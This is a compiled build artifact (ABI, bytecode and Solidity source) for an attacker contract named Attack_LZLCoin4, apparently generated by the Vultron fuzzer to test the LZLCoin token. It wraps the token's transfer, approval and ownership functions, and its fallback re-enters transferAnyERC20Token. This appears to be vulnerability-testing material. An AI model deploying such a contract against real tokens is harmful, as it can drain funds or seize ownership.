{
  "contractName": "Attack_LZLCoin4",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "target_contract",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "name": "_targetContract",
          "type": "address"
        }
      ],
      "payable": true,
      "stateMutability": "payable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_spender",
          "type": "address"
        },
        {
          "name": "_value",
          "type": "uint256"
        }
      ],
      "name": "vultron_approve",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_from",
          "type": "address"
        },
        {
          "name": "_to",
          "type": "address"
        },
        {
          "name": "_value",
          "type": "uint256"
        }
      ],
      "name": "vultron_transferFrom",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_to",
          "type": "address"
        },
        {
          "name": "_value",
          "type": "uint256"
        }
      ],
      "name": "vultron_transfer",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_pd",
          "type": "address"
        },
        {
          "name": "_tkA",
          "type": "uint256"
        },
        {
          "name": "_etA",
          "type": "uint256"
        }
      ],
      "name": "vultron_eT",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_newOwner",
          "type": "address"
        }
      ],
      "name": "vultron_transferOwnership",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "tokenAddress",
          "type": "address"
        },
        {
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "vultron_transferAnyERC20Token",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x6080604052604051602080610abc83398101806040528101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610a46806100766000396000f300608060405260043610610083576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680633a778d4214610187578063567f0aa5146101d4578063574ffc311461022b5780636695df111461028257806371b9dcf7146102c5578063cf2bfa0c14610312578063e4e26ee11461037f575b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663dc39d06d306103e86040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050602060405180830381600087803b15801561014957600080fd5b505af115801561015d573d6000803e3d6000fd5b505050506040513d602081101561017357600080fd5b810190808051906020019092919050505050005b34801561019357600080fd5b506101d2600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506103cc565b005b3480156101e057600080fd5b50610229600480360381019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190803590602001909291905050506104d0565b005b34801561023757600080fd5b506102406105dd565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561028e57600080fd5b506102c3600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610602565b005b3480156102d157600080fd5b50610310600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506106d9565b005b34801561031e57600080fd5b5061037d600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506107dd565b005b34801561038b57600080fd5b506103ca600480360381019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610916565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb83836040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050602060405180830381600087803b15801561049057600080fd5b505af11580156104a4573d6000803e3d6000fd5b505050506040513d60208110156104ba57600080fd5b8101908080519060200190929190505050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166307c299c28484846040518463ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018381526020018281526020019350505050602060405180830381600087803b15801561059c57600080fd5b505af11580156105b0573d6000803e3d6000fd5b505050506040513d60208110156105c657600080fd5b810190808051906020019092919050505050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f2fde38b826040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b1580156106be57600080fd5b505af11580156106d2573d6000803e3d6000fd5b5050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b383836040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050602060405180830381600087803b15801561079d57600080fd5b505af11580156107b1573d6000803e3d6000fd5b505050506040513d60208110156107c757600080fd5b8101908080519060200190929190505050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166323b872dd8484846040518463ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018281526020019350505050602060405180830381600087803b1580156108d557600080fd5b505af11580156108e9573d6000803e3d6000fd5b505050506040513d60208110156108ff57600080fd5b810190808051906020019092919050505050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663dc39d06d83836040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050602060405180830381600087803b1580156109da57600080fd5b505af11580156109ee573d6000803e3d6000fd5b505050506040513d6020811015610a0457600080fd5b81019080805190602001909291905050505050505600a165627a7a72305820dce82944e33a0b09fbc148e9ffede989c1d71e8b7c714f9ed4a438b0576bb4be0029",
  "source": "pragma solidity ^0.4.19;\n\nimport \"/home/liuye/Webank/vultron/contracts/LZLCoin.sol\";\n\ncontract Attack_LZLCoin4 {\n\n  LZLCoin public target_contract;\n\n  function Attack_LZLCoin4(address _targetContract) public payable {\n      target_contract = LZLCoin(_targetContract);\n  } \n\n  function vultron_approve(address _spender, uint256 _value) public {\n    target_contract.approve(_spender, _value);\n  } \n\n  function vultron_transferFrom(address _from, address _to, uint256 _value) public {\n    target_contract.transferFrom(_from, _to, _value);\n  } \n\n  function vultron_transfer(address _to, uint256 _value) public {\n    target_contract.transfer(_to, _value);\n  } \n\n  function vultron_eT(address _pd, uint256 _tkA, uint256 _etA) public {\n    target_contract.eT(_pd, _tkA, _etA);\n  } \n\n  function vultron_transferOwnership(address _newOwner) public {\n    target_contract.transferOwnership(_newOwner);\n  } \n\n  function vultron_transferAnyERC20Token(address tokenAddress, uint256 amount) public {\n    target_contract.transferAnyERC20Token(tokenAddress, amount);\n  } \n\n      function() public payable {\n        \n        target_contract.transferAnyERC20Token(this, 1000);\n      }\n      } \n",
  "sourcePath": "/home/liuye/Webank/vultron/contracts/Attack_LZLCoin4.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.26+commit.4563c3fc.Emscripten.clang"
  },
  "schemaVersion": "2.0.0",
  "updatedAt": "2020-05-01T07:32:40.118Z"
}